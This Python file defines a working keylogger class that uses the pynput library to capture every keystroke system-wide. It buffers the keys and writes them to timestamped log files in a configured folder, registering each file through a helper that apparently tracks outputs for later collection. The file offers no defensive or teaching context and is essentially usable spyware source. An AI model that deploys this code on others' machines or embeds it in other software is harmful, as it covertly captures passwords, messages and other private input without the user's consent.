import os
from datetime import datetime
from pynput.keyboard import Listener
from cfg import cfg_output_folder, cfg_add2files


class Keylogger:
    def __init__(self):
        self.buffer = 1024
        self.keys = []

    @staticmethod
    def _generate_filename():
        """Generate a unique filename for the log based on the current timestamp."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return os.path.join(cfg_output_folder(), f"keylog_{timestamp}.log")

    def _on_press(self, key):
        self.keys.append(key)
        if len(self.keys) > self.buffer:    # write to file if buffer is full and write2file function not call
            self.write2file()

    def write2file(self):
        """Write buffered keys to the output file."""
        if not self.keys:  # Avoid opening the file if there are no keys
            return

        try:
            output_file = self._generate_filename()
            cfg_add2files(output_file)

            with open(output_file, "a") as f:
                for key in self.keys:
                    k = str(key).replace("'", "")
                    if "space" in k:
                        f.write('\n')
                    elif "Key" not in k:
                        f.write(k)
                self.keys.clear()  # Clear the list after writing
        except OSError as e:
            print(f"Failed to write keys to file: {e}")

    def start_listener(self):
        """Run the key listener."""
        with Listener(on_press=self._on_press) as listener:
            listener.join()
